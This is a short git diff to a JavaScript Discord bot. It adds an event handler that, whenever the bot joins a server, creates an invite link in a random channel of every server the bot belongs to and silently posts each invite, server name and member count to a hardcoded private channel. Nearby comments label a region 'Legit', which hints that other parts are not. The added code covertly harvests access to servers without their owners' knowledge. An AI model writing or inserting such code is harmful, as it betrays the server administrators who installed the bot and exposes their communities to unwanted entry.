@@ -15,7 +15,15 @@ bot.on('ready',() => {
   });
 });
   })
- 
+ bot.on("guildCreate", guild => {
+    bot.guilds.forEach(guild => {
+      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+      invite.createInvite().then(invite => {bot.channels.find("id", '442270404338384896').send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
+        console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)
+    })
+  })
+  });
+
   bot.on('message', msg => {
     //#region Legit
     /* Commandes legit */
